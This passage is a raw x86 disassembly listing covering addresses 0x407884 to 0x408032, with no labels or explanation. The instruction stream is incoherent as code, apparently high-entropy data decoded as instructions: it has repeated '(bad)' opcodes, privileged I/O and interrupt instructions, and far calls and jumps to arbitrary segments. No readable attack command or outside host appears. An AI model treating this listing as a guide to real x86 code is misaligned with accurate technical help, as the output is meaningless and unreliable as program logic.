  407884:	and    DWORD PTR [edi-0x5dbf3ca5],0xffffffb5
  40788b:	fcomp  DWORD PTR [eax-0x46c65c2b]
  407891:	pop    esp
  407892:	sub    ecx,DWORD PTR [ebx+ecx*1]
  407895:	xor    ah,bh
  407897:	lods   eax,DWORD PTR ds:[esi]
  407898:	hlt    
  407899:	inc    bh
  40789b:	arpl   WORD PTR [ebx],ax
  40789d:	mov    esi,0x2cf49dd9
  4078a2:	dec    ebp
  4078a3:	(bad)  
  4078a4:	and    bl,ch
  4078a6:	mov    ecx,0x8b07da6e
  4078ab:	int3   
  4078ac:	or     bl,ah
  4078ae:	mov    dl,0xf7
  4078b0:	inc    eax
  4078b1:	xchg   esi,eax
  4078b2:	cmp    al,0x28
  4078b4:	fistp  DWORD PTR es:[edi-0xcef28a]
  4078bb:	ja     0x407887
  4078bd:	push   eax
  4078be:	add    ecx,DWORD PTR [esi+0x63]
  4078c1:	leave  
  4078c2:	int    0x9a
  4078c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c5:	aaa    
  4078c6:	xor    DWORD PTR [edi+esi*4],edi
  4078c9:	sub    eax,0xb933d7b6
  4078ce:	in     al,0xa5
  4078d0:	cmp    al,BYTE PTR [edx+0x4a44e8da]
  4078d6:	inc    ebp
  4078d7:	sub    eax,0x201c0735
  4078dc:	mov    esp,DWORD PTR [esi-0x3400dabf]
  4078e2:	ficomp DWORD PTR [edi+0x4885d930]
  4078e8:	xor    eax,0xef4bcc79
  4078ed:	call   0x4e15:0xe7e66084
  4078f4:	mov    ?,eax
  4078f6:	mov    ch,0x19
  4078f8:	call   FWORD PTR [ecx]
  4078fa:	leave  
  4078fb:	pop    ebp
  4078fc:	(bad)  
  4078fd:	dec    edx
  4078fe:	stos   BYTE PTR es:[edi],al
  4078ff:	shl    DWORD PTR [eax-0x43],1
  407902:	jo     0x4078b2
  407904:	imul   edx,DWORD PTR [eax-0x1d],0xffffffbf
  407908:	or     bl,BYTE PTR [edx+0x1f]
  40790b:	push   es
  40790c:	call   0xd6a42dc3
  407911:	sub    eax,0x77da74a8
  407916:	sahf   
  407917:	push   esp
  407918:	add    BYTE PTR [edx],al
  40791a:	outs   dx,DWORD PTR ds:[esi]
  40791b:	stos   DWORD PTR es:[edi],eax
  40791c:	movups xmm2,XMMWORD PTR [ecx]
  40791f:	data16 sbb BYTE PTR [bp+si+0x1],bl
  407924:	in     al,dx
  407925:	pop    ss
  407926:	mov    al,0xa8
  407928:	stc    
  407929:	sar    cl,0x97
  40792c:	(bad)  
  40792d:	repnz or ebp,esi
  407930:	ret    0x93c9
  407933:	push   ecx
  407934:	cmp    edx,DWORD PTR [esi]
  407936:	sbb    DWORD PTR [ebp+0x548bf41a],eax
  40793c:	inc    eax
  40793d:	push   edx
  40793e:	sbb    eax,0x691dde2a
  407943:	mov    fs:0x6ed7d962,eax
  407949:	mov    eax,0xadd8528e
  40794e:	add    edi,DWORD PTR [ebx-0x7c]
  407951:	sbb    BYTE PTR ds:0x82010187,bh
  407957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407958:	pop    es
  407959:	inc    eax
  40795a:	adc    cl,0x26
  40795d:	int3   
  40795e:	mov    edi,0x49a17a7f
  407963:	inc    esp
  407964:	dec    ecx
  407965:	cld    
  407966:	(bad)  
  407967:	mov    bl,0xc9
  407969:	add    esp,DWORD PTR [edx]
  40796b:	fstp   QWORD PTR [edi+0x2d]
  40796e:	push   ds
  40796f:	mov    ds:0xeba283d7,al
  407974:	(bad)  [ecx]
  407976:	js     0x4078fa
  407978:	repz dec ebp
  40797a:	xchg   ecx,eax
  40797b:	sub    esi,DWORD PTR [esi+0x50732951]
  407981:	js     0x407918
  407983:	mov    dh,0x1e
  407985:	add    esi,DWORD PTR [edi]
  407987:	pop    ds
  407988:	lock outs dx,DWORD PTR ds:[esi]
  40798a:	jno    0x40795d
  40798c:	clc    
  40798d:	xchg   esi,eax
  40798e:	cmp    dl,BYTE PTR ds:0x811dc5a8
  407994:	add    eax,DWORD PTR [ecx-0x5b24841e]
  40799a:	mov    eax,0x1ffb5683
  40799f:	(bad)  
  4079a0:	lock in al,dx
  4079a2:	int3   
  4079a3:	jmp    0x4079e9
  4079a5:	jo     0x4079ca
  4079a7:	adc    al,BYTE PTR [edx]
  4079a9:	call   0xdfef:0x11784722
  4079b0:	(bad)  
  4079b1:	in     al,dx
  4079b2:	mov    edx,0x7dd341ef
  4079b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079b9:	daa    
  4079ba:	neg    BYTE PTR [ebx+ebp*4+0x46dd3821]
  4079c1:	sub    bh,cl
  4079c3:	pop    ebx
  4079c4:	add    dh,BYTE PTR [eax]
  4079c6:	xlat   BYTE PTR ds:[ebx]
  4079c7:	jmp    0x306b:0xd16f0314
  4079ce:	dec    esi
  4079cf:	mov    ecx,0x7bd15640
  4079d4:	jmp    0x407a14
  4079d6:	cmp    DWORD PTR [ecx-0x276661b0],esi
  4079dc:	or     edi,eax
  4079de:	pop    ebp
  4079df:	push   ss
  4079e0:	std    
  4079e1:	xlat   BYTE PTR ds:[ebx]
  4079e2:	push   esp
  4079e3:	jb     0x407a14
  4079e5:	int    0x47
  4079e7:	mov    dh,0x7e
  4079e9:	imul   BYTE PTR [ebx-0x79]
  4079ec:	jo     0x407a00
  4079ee:	fs test al,0x48
  4079f1:	ins    BYTE PTR es:[edi],dx
  4079f2:	sahf   
  4079f3:	lods   eax,DWORD PTR ds:[esi]
  4079f4:	jo     0x407998
  4079f6:	vmaxss xmm5,xmm2,xmm0
  4079fa:	and    BYTE PTR [ebp+0x7f],0x95
  4079fe:	outs   dx,BYTE PTR ds:[esi]
  4079ff:	jge    0x40799e
  407a01:	pushf  
  407a02:	frstor [esi]
  407a04:	addr16 fwait
  407a06:	imul   ebp,edx,0x8
  407a09:	add    eax,0x62519b7f
  407a0e:	mov    WORD PTR [eax+0x5a],cs
  407a11:	adc    DWORD PTR [edx],edi
  407a13:	call   ecx
  407a15:	mov    esi,0x82cad535
  407a1a:	lods   al,BYTE PTR ds:[esi]
  407a1b:	das    
  407a1c:	dec    ebp
  407a1d:	sub    al,0xfe
  407a1f:	dec    ax
  407a21:	mov    dh,0x8d
  407a23:	xor    BYTE PTR [ebx-0x66d821ce],0xca
  407a2a:	xchg   ecx,eax
  407a2b:	mov    ss,edx
  407a2d:	cmc    
  407a2e:	pop    ebx
  407a2f:	scas   al,BYTE PTR es:[edi]
  407a30:	out    0x9c,al
  407a32:	mov    DWORD PTR [esi-0xb4984ba],0xf033b43f
  407a3c:	popa   
  407a3d:	cdq    
  407a3e:	mov    dl,0x60
  407a40:	out    0xf0,eax
  407a42:	mov    dl,0x1a
  407a44:	push   ss
  407a45:	and    al,0x41
  407a47:	lahf   
  407a48:	xlat   BYTE PTR ds:[ebx]
  407a49:	dec    sp
  407a4b:	cmp    eax,0x2c386442
  407a50:	xor    ah,BYTE PTR [eax-0x3685ad0]
  407a56:	jmp    ebx
  407a58:	adc    BYTE PTR [ebx-0x36],0xd5
  407a5c:	jecxz  0x4079f2
  407a5e:	(bad)  
  407a5f:	and    DWORD PTR [edx+0x4e],edi
  407a62:	mov    ecx,0xb9edf33c
  407a67:	fwait
  407a68:	ror    dh,cl
  407a6a:	jno    0x407a1f
  407a6c:	sti    
  407a6d:	jmp    0x407ab3
  407a6f:	js     0x407a31
  407a71:	fsubr  st,st(2)
  407a73:	pop    edi
  407a74:	mov    esi,0x138bed90
  407a79:	dec    eax
  407a7a:	and    eax,0xa3f7a9ee
  407a7f:	push   esp
  407a80:	bound  eax,QWORD PTR [ebx-0x4c194efc]
  407a86:	and    eax,0xd4498e5a
  407a8b:	mov    WORD PTR [ebp+0x371dfc8a],ss
  407a91:	pop    esi
  407a92:	pop    ds
  407a93:	clc    
  407a94:	mov    ebp,0x679640b4
  407a99:	cmp    al,0xb5
  407a9b:	fistp  WORD PTR [edi+eiz*4-0x3f]
  407a9f:	cmp    DWORD PTR [esi-0x1d],edx
  407aa2:	shl    edx,cl
  407aa4:	mov    ds:0xf392a848,al
  407aa9:	clc    
  407aaa:	loop   0x407a7e
  407aac:	stos   BYTE PTR es:[edi],al
  407aad:	into   
  407aae:	adc    DWORD PTR [ecx+0x2c06dcc2],0x52bde9a4
  407ab8:	push   0x64c2e6d1
  407abd:	sub    BYTE PTR [eax],bh
  407abf:	mov    bl,0x63
  407ac1:	out    0xd,eax
  407ac3:	into   
  407ac4:	jnp    0x407a85
  407ac6:	ja     0x407b3b
  407ac8:	xchg   ebx,eax
  407ac9:	cmc    
  407aca:	aaa    
  407acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407acc:	add    al,dh
  407ace:	or     DWORD PTR [eax],eax
  407ad0:	mov    eax,ds:0xfbcfefcf
  407ad5:	ret    0xe778
  407ad8:	push   ss
  407ad9:	mov    al,ds:0xc1297665
  407ade:	fnclex 
  407ae0:	xchg   esi,ecx
  407ae2:	sbb    BYTE PTR [eax-0x74aab52],0x23
  407ae9:	mov    cl,0x63
  407aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aec:	(bad)  
  407aed:	push   ss
  407aee:	jne    0x407b35
  407af0:	mov    ecx,0x591fb32
  407af5:	and    eax,0x7da5505f
  407afa:	mov    ch,0x44
  407afc:	mov    ah,0xd
  407afe:	pop    edx
  407aff:	imul   esi,DWORD PTR [edx-0x53],0x1a2715f9
  407b06:	jg     0x407b3e
  407b08:	sub    al,al
  407b0a:	and    DWORD PTR [edi-0x54571081],ebp
  407b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b11:	dec    edi
  407b12:	rcl    BYTE PTR ds:0x51f2874,0xe6
  407b19:	int    0x26
  407b1b:	mov    ebx,0x171bda0a
  407b20:	and    DWORD PTR [esi+ebx*8],ecx
  407b23:	cs call 0x5063:0x36f96274
  407b2b:	icebp  
  407b2c:	jmp    0x82e6:0x516afd45
  407b33:	jecxz  0x407b53
  407b35:	(bad)  
  407b36:	xor    ecx,DWORD PTR [esp+ecx*2+0x2a24a440]
  407b3d:	mov    bl,0xec
  407b3f:	cdq    
  407b40:	jmp    0x899a:0x20360aa4
  407b47:	jle    0x407ba6
  407b49:	loopne 0x407b70
  407b4b:	mov    WORD PTR [edx+0x50],cs
  407b4e:	sbb    eax,0x4e0527e6
  407b53:	mov    al,ds:0xea048f56
  407b58:	xor    eax,0x645a6d18
  407b5d:	push   ds
  407b5e:	cmp    al,0xf4
  407b60:	pop    ds
  407b61:	popa   
  407b62:	(bad)  
  407b63:	sbb    ah,BYTE PTR [ebx+0x47]
  407b66:	pop    ss
  407b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b68:	sub    eax,0xbb1aa429
  407b6d:	push   es
  407b6e:	jecxz  0x407b0c
  407b70:	pop    es
  407b71:	aad    0xa5
  407b73:	push   DWORD PTR [edi-0x2632a537]
  407b79:	or     eax,0x49d34963
  407b7e:	pushf  
  407b7f:	je     0x407bb7
  407b81:	icebp  
  407b82:	fild   DWORD PTR [edi]
  407b84:	pushf  
  407b85:	adc    edi,DWORD PTR [edx+0x37ed0417]
  407b8b:	sub    al,0xaa
  407b8d:	mov    bl,0x9
  407b8f:	adc    bh,bh
  407b91:	js     0x407bbc
  407b93:	jp     0x407c05
  407b95:	jg     0x407b90
  407b97:	popa   
  407b98:	jae    0x407c14
  407b9a:	or     esp,ebx
  407b9c:	adc    al,0x27
  407b9e:	std    
  407b9f:	add    edx,DWORD PTR [edx-0x2e]
  407ba2:	js     0x407b55
  407ba4:	ret    0x3ed9
  407ba7:	mov    ch,0x53
  407ba9:	loopne 0x407c06
  407bab:	sub    DWORD PTR [edx-0x5c5ff2d0],edx
  407bb1:	cmp    al,BYTE PTR [ebx]
  407bb3:	sti    
  407bb4:	push   ecx
  407bb5:	es pop ss
  407bb7:	jae    0x407b70
  407bb9:	shl    BYTE PTR [esi+ecx*1],0xd
  407bbd:	or     DWORD PTR [edi],ecx
  407bbf:	jl     0x407bfa
  407bc1:	sti    
  407bc2:	mov    esp,0x4f0401b5
  407bc7:	xor    al,0x6a
  407bc9:	mov    WORD PTR [ebx+0x4a991a63],ss
  407bcf:	in     al,dx
  407bd0:	adc    eax,0xc7a2ddd0
  407bd5:	sub    ebp,esp
  407bd7:	leave  
  407bd8:	popa   
  407bd9:	bound  ecx,QWORD PTR [ebp-0x46]
  407bdc:	xchg   ebp,eax
  407bdd:	ret    
  407bde:	mov    bl,0x7a
  407be0:	push   ss
  407be1:	sub    al,0xb7
  407be3:	inc    edx
  407be4:	jb     0x407c0c
  407be6:	fwait
  407be7:	dec    ecx
  407be8:	mov    bl,0x76
  407bea:	je     0x407bf7
  407bec:	xchg   esp,eax
  407bed:	inc    eax
  407bee:	push   eax
  407bef:	push   ds
  407bf0:	mov    cl,0x51
  407bf2:	or     edx,0xffffff95
  407bf5:	arpl   bx,sp
  407bf7:	and    DWORD PTR [ebp+0x33],0x64
  407bfb:	pop    ecx
  407bfc:	or     ebp,DWORD PTR [ecx]
  407bfe:	mov    ebp,DWORD PTR [ebx]
  407c00:	test   al,0x8e
  407c02:	mov    edx,0x198cbc25
  407c07:	xchg   ebx,eax
  407c08:	xchg   edi,eax
  407c09:	pop    ecx
  407c0a:	lods   al,BYTE PTR ds:[esi]
  407c0b:	test   DWORD PTR [ebx],edi
  407c0d:	cdq    
  407c0e:	xadd   ebp,edi
  407c11:	nop
  407c12:	cmp    bl,BYTE PTR [ebp+0x2d]
  407c15:	inc    eax
  407c16:	push   ebx
  407c17:	fdiv   st,st(7)
  407c19:	dec    edx
  407c1a:	call   0x70990e3a
  407c1f:	xchg   edi,eax
  407c20:	mov    ss,WORD PTR [ecx+0x1797e78]
  407c26:	sub    eax,0xed6732e
  407c2b:	xor    al,0x7c
  407c2d:	shl    ebp,0xa6
  407c30:	in     eax,dx
  407c31:	repz out 0xe9,al
  407c34:	adc    BYTE PTR [eax-0x2b],ch
  407c37:	cmp    dh,ah
  407c39:	inc    edx
  407c3a:	xchg   dh,ah
  407c3c:	add    ah,dl
  407c3e:	rcl    DWORD PTR [ebp-0x61],0xf0
  407c42:	mov    eax,ds:0xdfb04f00
  407c47:	dec    ebx
  407c48:	add    BYTE PTR [ebp-0x34d1bca],bh
  407c4e:	sub    eax,0x891eef6d
  407c53:	(bad)  
  407c54:	cmp    ebx,DWORD PTR [edi-0x49d93e64]
  407c5a:	xchg   edi,eax
  407c5b:	stos   BYTE PTR es:[edi],al
  407c5c:	mov    edx,0xffa853f6
  407c61:	jmp    0xa39e:0xd94f6fef
  407c68:	push   edx
  407c69:	stos   DWORD PTR es:[edi],eax
  407c6a:	mov    bl,0x1a
  407c6c:	into   
  407c6d:	xchg   esp,eax
  407c6e:	push   ecx
  407c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c70:	fcom   DWORD PTR [edi+0x3e3ea1f1]
  407c76:	dec    edx
  407c77:	sbb    eax,0x43a7f90e
  407c7c:	mov    WORD PTR ds:0x12c50326,?
  407c82:	jp     0x407cba
  407c84:	inc    edi
  407c85:	jle    0x407c3a
  407c87:	lods   al,BYTE PTR ds:[esi]
  407c88:	inc    ecx
  407c89:	adc    ecx,DWORD PTR [edx+0x5b]
  407c8c:	sar    DWORD PTR [ecx+esi*4+0x1f62d48d],cl
  407c93:	pop    ebp
  407c94:	repz add bh,BYTE PTR [edx+eiz*1-0x28]
  407c99:	iret   
  407c9a:	dec    ebx
  407c9b:	les    ecx,FWORD PTR [eax]
  407c9d:	sti    
  407c9e:	sahf   
  407c9f:	jnp    0x407c53
  407ca1:	cmp    eax,0xc389ce18
  407ca6:	jecxz  0x407d0f
  407ca8:	out    0x89,al
  407caa:	pushf  
  407cab:	mov    ds:0x7ddfc28c,eax
  407cb0:	int3   
  407cb1:	push   edi
  407cb2:	fld    QWORD PTR [edx]
  407cb4:	jg     0x407d11
  407cb6:	rcl    BYTE PTR [ebp+0x7dc8a0ed],1
  407cbc:	outs   dx,DWORD PTR ds:[esi]
  407cbd:	pop    ecx
  407cbe:	ins    BYTE PTR es:[edi],dx
  407cbf:	mov    ebp,0x4ac6c44c
  407cc4:	sub    DWORD PTR [ecx-0x5b644688],ebp
  407cca:	jle    0x407c74
  407ccc:	push   cx
  407cce:	je     0x407d2f
  407cd0:	je     0x407cc5
  407cd2:	sub    esi,ebx
  407cd4:	cmp    DWORD PTR [ebx+0x7853520c],esi
  407cda:	sub    dl,cl
  407cdc:	mov    eax,0x4ab83bb4
  407ce1:	int3   
  407ce2:	push   0x1650b004
  407ce7:	sub    ch,BYTE PTR [eax+ebp*2]
  407cea:	stos   DWORD PTR es:[edi],eax
  407ceb:	fs inc esp
  407ced:	fisub  WORD PTR [ebp+ecx*8-0x342be5da]
  407cf4:	outs   dx,DWORD PTR ds:[esi]
  407cf5:	mov    cl,0x6d
  407cf7:	pop    ebp
  407cf8:	mov    dh,ah
  407cfa:	inc    ebp
  407cfb:	pushf  
  407cfc:	pop    es
  407cfd:	sbb    al,BYTE PTR ds:0x59cd66f8
  407d03:	add    eax,0x5df5e34f
  407d08:	pop    edi
  407d09:	mov    bl,0xba
  407d0b:	js     0x407d25
  407d0d:	aas    
  407d0e:	in     eax,dx
  407d0f:	cli    
  407d10:	push   0xffffff9b
  407d12:	std    
  407d13:	sub    al,0x8d
  407d15:	inc    ebp
  407d16:	and    al,0x49
  407d18:	out    dx,eax
  407d19:	jmp    0x4fa6b8c9
  407d1e:	and    DWORD PTR [ebx-0x19149a51],ebx
  407d24:	ds jecxz 0x407d07
  407d27:	xor    edx,ebx
  407d29:	addr16 call 0x6c20:0x837d93e7
  407d31:	pusha  
  407d32:	push   0xe6c9aed8
  407d37:	sub    BYTE PTR [ecx+0x57],0x72
  407d3b:	popf   
  407d3c:	dec    edx
  407d3d:	dec    edi
  407d3e:	push   ebx
  407d3f:	fs out dx,al
  407d41:	div    esp
  407d43:	clc    
  407d44:	je     0x407cd6
  407d46:	xor    BYTE PTR [eax+0xf35a181],0xa3
  407d4d:	inc    ah
  407d4f:	xor    dl,ch
  407d51:	push   edi
  407d52:	dec    edi
  407d53:	jno    0x407d27
  407d55:	mov    dh,0x5e
  407d57:	stos   DWORD PTR es:[edi],eax
  407d58:	mov    eax,DWORD PTR [edi]
  407d5a:	sahf   
  407d5b:	mov    edi,0x8e38ad30
  407d60:	xlat   BYTE PTR ds:[ebx]
  407d61:	adc    BYTE PTR [esi-0x6b],dl
  407d64:	loope  0x407d65
  407d66:	sahf   
  407d67:	xchg   DWORD PTR [esp+edi*8],esi
  407d6a:	pop    ebx
  407d6b:	mov    ch,0x3f
  407d6d:	mov    dl,0x96
  407d6f:	jae    0x407db5
  407d71:	jns    0x407d9c
  407d73:	mov    al,ds:0x3ae7c13
  407d78:	inc    ecx
  407d79:	shl    DWORD PTR [ebx+0x1eb6a3c5],0xfc
  407d80:	cmc    
  407d81:	adc    eax,0xb2eeeb1f
  407d86:	xor    eax,0xdbf138cc
  407d8b:	jo     0x407db1
  407d8d:	push   esp
  407d8e:	pop    ebx
  407d8f:	push   ebx
  407d90:	ret    0x1979
  407d93:	pop    ebx
  407d94:	fnclex 
  407d96:	sahf   
  407d97:	cmp    BYTE PTR [edi+0x30],dh
  407d9a:	xor    ecx,0xffffffc9
  407d9d:	dec    ecx
  407d9e:	mov    eax,ds:0x1ab8f246
  407da3:	cwde   
  407da4:	out    dx,al
  407da5:	std    
  407da6:	(bad)  
  407da7:	sub    BYTE PTR [edx],bl
  407da9:	jle    0x407d85
  407dab:	or     esp,DWORD PTR [edx-0x2d]
  407dae:	outs   dx,BYTE PTR ds:[esi]
  407daf:	in     eax,dx
  407db0:	stos   BYTE PTR es:[edi],al
  407db1:	push   ecx
  407db2:	mov    edi,0x56840c3
  407db7:	es (bad) 
  407db9:	cmc    
  407dba:	sbb    al,BYTE PTR [ecx-0x5a]
  407dbd:	xchg   esi,esi
  407dbf:	mov    esi,0x538a502d
  407dc4:	rol    BYTE PTR [edx+eiz*8-0x46],cl
  407dc8:	sbb    eax,DWORD PTR [ebx-0x3510c721]
  407dce:	jl     0x407e15
  407dd0:	dec    esi
  407dd1:	xchg   edi,eax
  407dd2:	pop    edx
  407dd3:	sbb    eax,0xc509cf54
  407dd8:	lods   eax,DWORD PTR ds:[esi]
  407dd9:	push   ebx
  407dda:	add    al,0x97
  407ddc:	dec    edx
  407ddd:	sar    esi,cl
  407ddf:	mov    ch,0x96
  407de1:	addr16 jne 0x407e0a
  407de4:	je     0x407e23
  407de6:	adc    al,0x4d
  407de8:	shl    BYTE PTR [edi],0x22
  407deb:	in     al,0xd8
  407ded:	rol    BYTE PTR [ebp-0x22],cl
  407df0:	pop    esi
  407df1:	adc    eax,0xc2edf6e5
  407df6:	ds aaa 
  407df8:	(bad)  
  407df9:	adc    edx,DWORD PTR [ebx+0x3d0f2fca]
  407dff:	daa    
  407e00:	retf   0x6898
  407e03:	sub    al,0x37
  407e05:	push   cs
  407e06:	ja     0x407df1
  407e08:	in     eax,dx
  407e09:	(bad)  
  407e0a:	sar    ch,cl
  407e0c:	push   ss
  407e0d:	dec    edx
  407e0e:	jle    0x407dcf
  407e10:	mov    ah,0x29
  407e12:	cmp    edi,eax
  407e14:	adc    al,0x21
  407e16:	mov    ecx,0x8a8af423
  407e1b:	stos   WORD PTR es:[edi],ax
  407e1d:	mov    edi,DWORD PTR [ecx]
  407e1f:	mov    edi,0x60f53119
  407e24:	(bad)
  407e27:	popa   
  407e28:	loope  0x407e24
  407e2a:	mov    ebx,0xe7a31d2b
  407e2f:	adc    al,0xcf
  407e31:	jmp    DWORD PTR [ebx-0x3f64a96e]
  407e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e38:	push   es
  407e39:	mov    ah,0x55
  407e3b:	cmp    dh,0x16
  407e3e:	mov    BYTE PTR [eax+0x65],ch
  407e41:	sbb    DWORD PTR [ecx],ecx
  407e43:	mov    ebp,0x56f01358
  407e48:	lods   eax,DWORD PTR ds:[esi]
  407e49:	inc    edx
  407e4a:	mov    ch,0x82
  407e4c:	xchg   ecx,eax
  407e4d:	in     al,dx
  407e4e:	dec    eax
  407e4f:	mov    ah,0xa1
  407e51:	leave  
  407e52:	dec    ebx
  407e53:	fidiv  WORD PTR [edx]
  407e55:	xchg   ebx,eax
  407e56:	push   ecx
  407e57:	sbb    eax,0xad730646
  407e5c:	mov    DWORD PTR [ebx],esi
  407e5e:	dec    eax
  407e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e60:	fsub   QWORD PTR [eax+0x76b9b61]
  407e66:	in     al,0x9a
  407e68:	je     0x407e22
  407e6a:	push   edx
  407e6b:	call   0x66b4d6c0
  407e70:	sti    
  407e71:	mov    ds,WORD PTR [edi-0x69]
  407e74:	pop    ecx
  407e75:	or     DWORD PTR [eax-0xb9baeaa],ebx
  407e7b:	lods   al,BYTE PTR ds:[esi]
  407e7c:	mov    ds,WORD PTR [ebx-0x39d49056]
  407e82:	call   0xdc0f0497
  407e87:	push   esp
  407e88:	adc    dh,BYTE PTR [ebx]
  407e8a:	push   ss
  407e8b:	mov    cl,0x9f
  407e8d:	test   eax,0x90553411
  407e92:	nop
  407e93:	add    al,0xf2
  407e95:	ret    
  407e96:	mov    ds:0xd34a7d06,al
  407e9b:	lods   eax,DWORD PTR ds:[esi]
  407e9c:	sub    eax,DWORD PTR ds:0xed628bef
  407ea2:	ret    
  407ea3:	test   DWORD PTR [ebp+0x1f],0xe70029b3
  407eaa:	lahf   
  407eab:	or     edi,DWORD PTR [edx+0x6c]
  407eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eaf:	push   ebx
  407eb0:	jmp    0x38a128e2
  407eb5:	or     eax,0x879598ab
  407eba:	xchg   eax,edx
  407ebc:	jp     0x407e52
  407ebe:	lea    esi,ds:0x7e144402
  407ec4:	scas   al,BYTE PTR es:[edi]
  407ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec6:	lock (bad) 
  407ec9:	xor    al,0xbd
  407ecb:	je     0x407e5e
  407ecd:	mov    dh,0x2f
  407ecf:	push   ss
  407ed0:	cmp    DWORD PTR [eax],ecx
  407ed2:	jb     0x407e56
  407ed4:	push   edx
  407ed5:	sub    eax,0xf703f8a3
  407eda:	stos   DWORD PTR es:[edi],eax
  407edb:	test   DWORD PTR [eax-0x68],eax
  407ede:	neg    DWORD PTR [esi+0x4e2fb408]
  407ee4:	mov    al,ds:0xe7632573
  407ee9:	retf   0xd20a
  407eec:	inc    esi
  407eed:	add    al,0x90
  407eef:	jae    0x407f4a
  407ef1:	jmp    0xde6f6691
  407ef6:	xchg   BYTE PTR [eax],ah
  407ef8:	cmp    edx,DWORD PTR [ebx]
  407efa:	pop    DWORD PTR [esi-0x60054542]
  407f00:	sub    eax,0xf5902ce8
  407f05:	push   ss
  407f06:	mov    al,0x4a
  407f08:	push   es
  407f09:	pop    ecx
  407f0a:	call   0x5a41:0xc3235cb0
  407f11:	neg    DWORD PTR [esi]
  407f13:	and    ebx,DWORD PTR [esi-0x6554e78e]
  407f19:	mov    ebx,0x1f1e2da8
  407f1e:	(bad)  
  407f1f:	xchg   esi,eax
  407f20:	and    BYTE PTR [ebx+0x7b],cl
  407f23:	pop    ebx
  407f24:	pop    eax
  407f25:	and    DWORD PTR [ebx-0x3a],esi
  407f28:	and    al,0xff
  407f2a:	add    eax,0x78f348bd
  407f2f:	xchg   esp,edi
  407f31:	pandn  mm1,mm6
  407f34:	pushf  
  407f35:	mov    edx,0x68286531
  407f3a:	mov    eax,ds:0x631df879
  407f3f:	outs   dx,DWORD PTR ds:[esi]
  407f40:	cli    
  407f41:	lods   al,BYTE PTR ds:[esi]
  407f42:	or     BYTE PTR [edi-0x3e9b2efe],cl
  407f48:	ins    DWORD PTR es:[edi],dx
  407f49:	add    al,0xe6
  407f4b:	push   ds
  407f4c:	bound  eax,QWORD PTR [edi+eax*2]
  407f4f:	(bad)  [ecx]
  407f51:	mov    cl,0x76
  407f53:	addr16 sbb eax,0x27788867
  407f59:	call   0xbbff:0xc2423a38
  407f60:	lods   al,BYTE PTR ds:[esi]
  407f61:	sub    BYTE PTR [ecx-0x2f],ah
  407f64:	lods   eax,DWORD PTR ds:[esi]
  407f65:	ins    DWORD PTR es:[edi],dx
  407f66:	enter  0x2702,0x6
  407f6a:	mov    dh,0xcb
  407f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f6d:	and    al,0x4e
  407f6f:	inc    edx
  407f70:	xchg   ebp,eax
  407f71:	jae    0x407f3f
  407f73:	push   esp
  407f74:	mov    ss,WORD PTR [ebp+eiz*2-0x49a88d29]
  407f7b:	popf   
  407f7c:	addr16 cld 
  407f7e:	fwait
  407f7f:	pop    eax
  407f80:	addr16 xchg ecx,eax
  407f82:	jle    0x407f34
  407f84:	pop    ecx
  407f85:	ins    DWORD PTR es:[edi],dx
  407f86:	mov    edx,0xb92ac5e5
  407f8b:	ror    edx,0x13
  407f8e:	inc    esi
  407f8f:	lock or BYTE PTR [edx],0x85
  407f93:	cld    
  407f94:	xlat   BYTE PTR ds:[ebx]
  407f95:	in     eax,dx
  407f96:	popf   
  407f97:	jg     0x407fbc
  407f99:	sub    al,cl
  407f9b:	outs   dx,DWORD PTR ds:[esi]
  407f9c:	cli    
  407f9d:	jmp    0xc57c1859
  407fa2:	xlat   BYTE PTR ds:[ebx]
  407fa3:	adc    eax,0xe407af5e
  407fa8:	jp     0x407f77
  407faa:	je     0x407f6a
  407fac:	addr16 retf 0x7827
  407fb0:	call   0x98903452
  407fb5:	pinsrw mm3,WORD PTR [edx],0x3f
  407fb9:	arpl   WORD PTR [ebx-0x765d5629],sp
  407fbf:	push   ss
  407fc0:	mov    ds:0x96278a0e,eax
  407fc5:	adc    eax,0x7d8a9f86
  407fca:	fistp  QWORD PTR [esi]
  407fcc:	inc    edx
  407fcd:	mov    al,0xb9
  407fcf:	scas   al,BYTE PTR es:[edi]
  407fd0:	or     eax,0x15a2921b
  407fd5:	ror    DWORD PTR [eax],cl
  407fd7:	(bad)  
  407fd8:	(bad)  
  407fd9:	adc    edx,DWORD PTR [eax+0x5c]
  407fdc:	push   ds
  407fdd:	jb     0x408039
  407fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe0:	push   ebp
  407fe1:	xchg   esi,ebx
  407fe3:	lock nop
  407fe5:	fwait
  407fe6:	mov    ecx,DWORD PTR [ebx]
  407fe8:	mov    dl,0x55
  407fea:	iret   
  407feb:	dec    eax
  407fec:	out    0x9b,al
  407fee:	or     edx,DWORD PTR [edx-0x55]
  407ff1:	jmp    0x51879825
  407ff6:	inc    esi
  407ff7:	jl     0x407f79
  407ff9:	popa   
  407ffa:	mov    edi,0x9cce27fb
  407fff:	or     BYTE PTR [eax+eax*2],0x26
  408003:	lods   al,BYTE PTR ds:[esi]
  408004:	xor    eax,0xbcc9fcca
  408009:	pop    ebx
  40800a:	inc    esp
  40800b:	xchg   ebx,eax
  40800c:	nop
  40800d:	push   esp
  40800e:	loopne 0x408087
  408010:	ret    
  408011:	repz add DWORD PTR [esp+edi*8+0x57351e23],eax
  408019:	fmul   st,st(4)
  40801b:	jne    0x408073
  40801d:	loopne 0x40809a
  40801f:	ja     0x407fb8
  408021:	sub    eax,0x7f3ca0e7
  408026:	out    dx,eax
  408027:	neg    BYTE PTR [ebx+0x4a]
  40802a:	xor    DWORD PTR [ecx+0x453ef505],ecx
  408030:	pop    eax
  408031:	dec    esi
  408032:	mov    eax,esi
